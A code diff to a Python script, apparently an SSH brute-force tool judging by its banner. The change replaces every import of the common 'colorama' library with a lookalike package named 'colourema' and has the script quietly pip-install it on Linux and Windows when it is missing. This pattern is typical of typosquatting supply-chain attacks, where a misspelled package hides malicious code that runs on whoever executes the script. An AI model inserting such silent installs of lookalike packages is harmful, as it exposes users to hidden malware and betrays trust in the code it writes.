@@ -19,10 +19,12 @@ if platform.system().startswith("Linux"):
         os.system("python3 -m pip install pystyle -q -q -q")
         from pystyle import *
     try:
-        import colorama
+        import colourema
+        from colourema import Fore, Back, Style
     except ImportError:
-        os.system("python3 -m pip install colorama -q -q -q")
-        import colorama
+        os.system("python3 -m pip install colourema -q -q -q")
+        import colourema
+        from colourema import Fore, Back, Style
 
 elif platform.system().startswith("Windows"):
     try:
@@ -41,11 +43,13 @@ elif platform.system().startswith("Windows"):
         os.system("python -m pip install pystyle -q -q -q")
         from pystyle import *
     try:
-        import colorama
+        import colourema
+        from colourema import Fore, Back, Style
     except ImportError:
-        os.system("python -m pip install colorama -q -q -q")
-        import colorama
-colorama.deinit()
+        os.system("python -m pip install colourema -q -q -q")
+        import colourema
+        from colourema import Fore, Back, Style
+colourema.deinit()
 banner = Center.XCenter("""
          ______ ____  _   _       ____  ____  _   _ _____ _____ _______
         / / ___/ ___|| | | |     | __ )|  _ \| | | |_   _| ____|___ /\ \`
